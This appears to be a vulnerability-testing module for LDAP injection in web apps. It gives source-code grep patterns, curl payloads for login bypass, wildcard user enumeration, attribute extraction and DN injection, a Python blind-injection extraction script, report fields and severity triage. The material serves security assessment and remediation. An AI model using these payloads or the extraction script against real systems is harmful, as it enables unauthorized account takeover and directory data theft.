# VULN MODULE — LDAP Injection
# Asset: webapp
# CWE-90 | Report prefix: WEB-LDAP

## THREAT MODEL

LDAP (Lightweight Directory Access Protocol) injection occurs when user-controlled
input is concatenated into an LDAP search filter or DN (Distinguished Name) without
proper escaping. LDAP filters follow a prefix notation with special characters
that alter query semantics when injected.

Applications at risk:
- Authentication systems backed by Active Directory or OpenLDAP
- Corporate VPN / SSO portals using LDAP for identity lookup
- HR/employee directory search features
- Internal tools that query group membership for RBAC

Special LDAP characters:
  `*`  `(`  `)`  `\`  `NUL`  AND: `&`  OR: `|`  NOT: `!`

Filter injection consequences:
- Authentication bypass: manipulate filter to always return true
- User enumeration: wildcard `*` returns all matching objects
- Attribute extraction: inject to include normally hidden attributes
- Blind injection: boolean-based inference via response differences

## VULNERABILITY CLASSES

1. Authentication Bypass                   CWE-90   — filter always evaluates true → login without password
2. User / Account Enumeration             CWE-200  — wildcard injection returns all user objects
3. Attribute Disclosure                   CWE-200  — injected filter exposes sensitive LDAP attributes
4. Blind LDAP Injection (Boolean-based)   CWE-90   — binary true/false responses leak data character by character
5. DN Injection                           CWE-90   — Distinguished Name constructed from user input
6. Second-Order LDAP Injection            CWE-90   — injected data stored, later used in LDAP query
7. Group Membership Bypass (RBAC)         CWE-285  — inject to appear as member of privileged group

## WHITEBOX STATIC ANALYSIS

```bash
# ── Java — JNDI / LDAP API ────────────────────────────────────────────────────
grep -rn "LdapContext\|InitialDirContext\|DirContext\|NamingEnumeration\|SearchControls" \
  --include="*.java" -A10
# Flag: search() calls where filter string includes user-controlled variable

grep -rn "\.search(\|\.lookup(\|searchFilter\|ldapFilter\|cn=.*\+" \
  --include="*.java" -A5
# String concat into LDAP filter → injection point
# Safe pattern: javax.naming.directory.BasicAttributes (no filter concat)

# ── C# / .NET — Active Directory ──────────────────────────────────────────────
grep -rn "DirectorySearcher\|DirectoryEntry\|PrincipalContext\|Filter\s*=" \
  --include="*.cs" -A10
grep -rn "\.Filter\s*=\|searcher\.Filter\|\"(&\|(|(cn=" --include="*.cs" -A5
# DirectorySearcher.Filter = "(&(objectClass=user)(cn=" + username + "))" → injection

grep -rn "FindByIdentity\|GetGroups\|IsMemberOf" --include="*.cs" -A5

# ── Python — ldap3 / python-ldap ─────────────────────────────────────────────
grep -rn "ldap\.search_s\|ldap\.search_ext\|ldap3\|Connection\|search(" \
  --include="*.py" -A10
grep -rn "filter\s*=.*%s\|filter\s*=.*format\|filter.*\+.*\|f\".*cn=" \
  --include="*.py" -A5
# conn.search(search_filter="(uid=" + username + ")") → injection

# Check for safe escaping:
grep -rn "escape_filter_chars\|escape_dn_chars\|ldap\.filter\.escape_filter_chars" \
  --include="*.py"
# If NOT found near search calls → no escaping

# ── PHP — LDAP extension ──────────────────────────────────────────────────────
grep -rn "ldap_search\|ldap_bind\|ldap_connect\|ldap_read\|ldap_list" \
  --include="*.php" -A10
grep -rn "\\\$filter\s*=\|\\\$query\s*=\|ldap_escape" --include="*.php" -A5
# ldap_search($conn, $base, "(uid=" . $_POST['user'] . ")") → injection
# Safe: ldap_escape($input, '', LDAP_ESCAPE_FILTER)

# ── Node.js — ldapjs / activedirectory ───────────────────────────────────────
grep -rn "ldapjs\|ActiveDirectory\|ldap\.createClient\|ad\.authenticate\|client\.search" \
  --include="*.js" --include="*.ts" -A10
grep -rn "filter.*\+\|filter.*\`\|filter.*username\|filter.*email" \
  --include="*.js" --include="*.ts" -A5

# ── Ruby — Net::LDAP ──────────────────────────────────────────────────────────
grep -rn "Net::LDAP\|ldap\.search\|ldap\.bind_as\|:filter =>" --include="*.rb" -A10
grep -rn "Net::LDAP::Filter\.eq\|Net::LDAP::Filter\.construct" --include="*.rb" -A5
# Filter.eq("uid", username) is safe; "(&(uid=" + username + "))" is not

# ── ActiveRecord / Devise LDAP ────────────────────────────────────────────────
grep -rn "devise\|Devise.*ldap\|ldap_authenticatable\|ldap_create_user" \
  --include="*.rb" --include="*.yml" -A5
# Misconfigurations in devise_ldap_authenticatable gem

# ── Check for string concatenation into filter (all languages) ────────────────
grep -rn "objectClass=user\|objectClass=person\|sAMAccountName\|userPrincipalName\|uid=" \
  --include="*.java" --include="*.cs" --include="*.py" \
  --include="*.php" --include="*.js" --include="*.rb" -B2 -A5
# Look for dynamic string building adjacent to these LDAP attribute patterns
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Basic injection probes (login form)

```bash
TARGET="https://target.com"

# Standard login fields to test: username, email, uid, login, user

# ── Wildcard enumeration ──────────────────────────────────────────────────────
# Submit * as username — if LDAP filter is (uid=INPUT), becomes (uid=*)
# Returns first matching user in directory → login as unknown user
curl -sk -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=*&password=anything"
# Successful login = wildcard accepted → user enumeration / auth bypass

# Wildcard with password field:
curl -sk -X POST "$TARGET/login" \
  -d "username=admin&password=*"
# If filter includes password: (&(uid=admin)(userPassword=*)) → bypass if unsalted
```

### Step 2 — Authentication bypass via filter manipulation

```bash
# Target filter: (&(uid=INPUT)(userPassword=PASS))
# Injecting into username field:

# Close the uid clause, add OR true condition:
# Input: admin)(&)  → filter becomes: (&(uid=admin)(&)(userPassword=PASS))
# (&) is always true in some LDAP implementations
curl -sk -X POST "$TARGET/login" \
  -d "username=admin%29%28%26%29&password=anything"

# Inject OR condition to bypass password check:
# Input: *)(uid=*))(|(uid=*
# Filter: (&(uid=*)(uid=*))(|(uid=*)(userPassword=PASS))
curl -sk -X POST "$TARGET/login" \
  -d "username=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A&password=x"

# Classic always-true injection:
# Input: admin)(|(password=*)
# Filter: (&(uid=admin)(|(password=*)(userPassword=PASS))
curl -sk -X POST "$TARGET/login" \
  -d "username=admin%29%28%7C%28password%3D%2A%29&password=x"

# Null byte injection (terminates filter in some C-based LDAP libs):
curl -sk -X POST "$TARGET/login" \
  -d $'username=admin\x00&password=x'
```

### Step 3 — User enumeration via wildcard

```bash
# Test character-by-character prefix enumeration:
# Filter: (uid=a*)  → does user starting with "a" exist?

for prefix in a b c d e f admin root user test; do
  response=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "$TARGET/login" \
    -d "username=${prefix}*&password=x")
  echo "prefix=$prefix → HTTP $response"
done
# HTTP 200 (or different error message) for valid prefix = enumerable

# Binary search for valid usernames:
for char in {a..z} {0..9}; do
  resp=$(curl -sk -X POST "$TARGET/login" -d "username=${char}*&password=x" \
    -w "%{http_code}" -o /tmp/ldap_resp.txt)
  body=$(cat /tmp/ldap_resp.txt)
  if echo "$body" | grep -qi "invalid password\|wrong password"; then
    echo "[USER EXISTS prefix=$char] - password error returned (not 'user not found')"
  fi
done
```

### Step 4 — Attribute extraction via injection

```bash
# If app reflects any LDAP attribute in response, inject to extract others:
# Target filter: (cn=INPUT)
# Inject: *)(mail=*))%00  → may trigger attribute-level logic

# Test for mail attribute exposure:
curl -sk -X POST "$TARGET/search" \
  -d "query=*)(mail=*"
# Does response include email addresses? → attribute extraction

# Inject to expose all users:
curl -sk "$TARGET/directory?name=*"
curl -sk "$TARGET/user-search?q=%2A"  # URL-encoded *
```

### Step 5 — Blind LDAP injection (boolean-based)

```bash
# Infer data character by character using filter conditions that yield different app responses
# Target filter: (&(uid=INPUT)(objectClass=person))
# True condition:  uid=admin*  → returns user → app shows "wrong password"
# False condition: uid=zzz*   → no user    → app shows "user not found"

TARGET_USER="admin"
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ._@-"
ATTRIBUTE="mail"  # extract email of TARGET_USER

# Probe: does admin's mail start with 'a'?
# Inject filter: (&(uid=admin)(mail=a*))
curl -sk -X POST "$TARGET/login" \
  -d "username=admin)($ATTRIBUTE=a*)%00&password=x"

# Automate with Python:
cat << 'EOF'
import requests
import string

TARGET = "https://target.com/login"
ATTRIBUTE = "mail"
USERNAME = "admin"

def probe(prefix):
    payload = f"{USERNAME})({ATTRIBUTE}={prefix}*)\x00"
    r = requests.post(TARGET, data={"username": payload, "password": "x"}, allow_redirects=False)
    # Adjust condition based on app behavior:
    # True response = "Invalid password" (user found but password wrong)
    # False response = "User not found"
    return "invalid password" in r.text.lower()

result = ""
for _ in range(50):
    found = False
    for c in string.printable:
        if c in "*()\\\x00": continue
        if probe(result + c):
            result += c
            print(f"[+] {ATTRIBUTE} so far: {result}*")
            found = True
            break
    if not found:
        break
print(f"[DONE] {ATTRIBUTE} = {result}")
EOF
```

### Step 6 — DN injection

```bash
# If user input is used in Distinguished Name (DN) construction:
# e.g., "cn=" + username + ",ou=users,dc=target,dc=com"
# Inject: admin,dc=target,dc=com
# DN becomes: cn=admin,dc=target,dc=com,ou=users,dc=target,dc=com → attacker-chosen DN

curl -sk -X POST "$TARGET/login" \
  -d "username=admin%2Cdc%3Dtarget%2Cdc%3Dcom&password=x"
# Different error = DN parsed differently = DN injection possible
```

## DYNAMIC CONFIRMATION

### Confirming Authentication Bypass

```bash
# 1. Send bypass payload:
curl -sk -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST "https://target.com/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=%2A%29%28%26%29&password=x" \
  -L -v 2>&1 | grep -iE "location|set-cookie|dashboard|logged.in|welcome"

# 2. With received session cookie, access authenticated endpoint:
curl -sk -b /tmp/cookies.txt "https://target.com/account/profile"
# Successful response = authentication bypassed

# 3. Document which user was returned (often first user in directory = privileged):
curl -sk -b /tmp/cookies.txt "https://target.com/account/profile" | \
  grep -iE "username|email|role|admin"
```

### Confirming User Enumeration

```bash
# Compare error messages for existing vs non-existing users:

# Probe with known-existing username (e.g., from password reset flow):
curl -sk -X POST "https://target.com/login" \
  -d "username=admin*&password=wrongpass" \
  -o /tmp/existing.txt

# Probe with non-existing username:
curl -sk -X POST "https://target.com/login" \
  -d "username=zzznobody*&password=wrongpass" \
  -o /tmp/nonexisting.txt

diff /tmp/existing.txt /tmp/nonexisting.txt
# Different responses = enumeration via wildcard confirmed
```

## REPORT_BUNDLE FIELDS

```json
{
  "id": "WEB-LDAP-001",
  "title": "LDAP Injection in login allows authentication bypass via wildcard filter manipulation",
  "cwe": 90,
  "severity": "Critical",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
  "cvss_score": 9.1,
  "endpoint": "POST https://target.com/login",
  "method": "POST",
  "parameter": "username",
  "payload": "*)(uid=*))(|(uid=*",
  "evidence": {
    "request": "POST /login HTTP/1.1\\nContent-Type: application/x-www-form-urlencoded\\n\\nusername=%2A%29%28%26%29&password=x",
    "response_status": 302,
    "response_snippet": "Location: /dashboard",
    "session_cookie": "session=<authenticated_session_value>",
    "authenticated_as": "admin (first directory entry)"
  },
  "impact": "Unauthenticated attacker can bypass login and authenticate as any user, typically the first account in the LDAP directory (often an administrator). Full account takeover without credentials.",
  "remediation": "Escape all LDAP special characters using the appropriate library function before including user input in filters: Java: javax.naming.ldap.Rdn.escapeValue() | Python: ldap.filter.escape_filter_chars() | PHP: ldap_escape($input, '', LDAP_ESCAPE_FILTER) | .NET: LDAP queries via parameterized System.DirectoryServices.Protocols. Never construct LDAP filter strings via string concatenation."
}
```

## TRIAGE NOTE

LDAP wildcard accepted but only returns error difference (enumeration): Medium
LDAP auth bypass confirmed (login without valid credentials): Critical
LDAP attribute extraction of sensitive data (passwords, tokens): High / Critical
Blind LDAP injection (data extractable character by character): High
DN injection with no auth bypass or data leak: Low / Medium
LDAP injection in internal-only admin panel (requires prior auth): Medium
Active Directory: also test for LDAP over SSL (port 636) vs plaintext (port 389) —
credential exposure in transit compounds severity.
